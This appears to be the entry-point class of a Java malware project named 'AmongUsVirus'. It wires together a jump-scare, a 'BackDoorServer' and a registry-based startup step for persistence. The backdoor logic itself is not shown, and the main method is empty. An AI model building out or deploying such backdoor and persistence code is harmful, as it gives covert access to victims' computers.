package com.github.pulsebeat02;

import com.github.pulsebeat02.backdoor.BackDoorServer;
import com.github.pulsebeat02.backdoor.ServerStartup;
import com.github.pulsebeat02.jumpscare.RandomJumpScare;

public class AmongUsVirus {

    private final BackDoorServer server;
    private final ServerStartup startup;

    public AmongUsVirus() {
        new RandomJumpScare();
        server = new BackDoorServer();
        startup = new ServerStartup();
        startup.addRegistry();
    }

    public static void main(final String[] args) {

    }

}
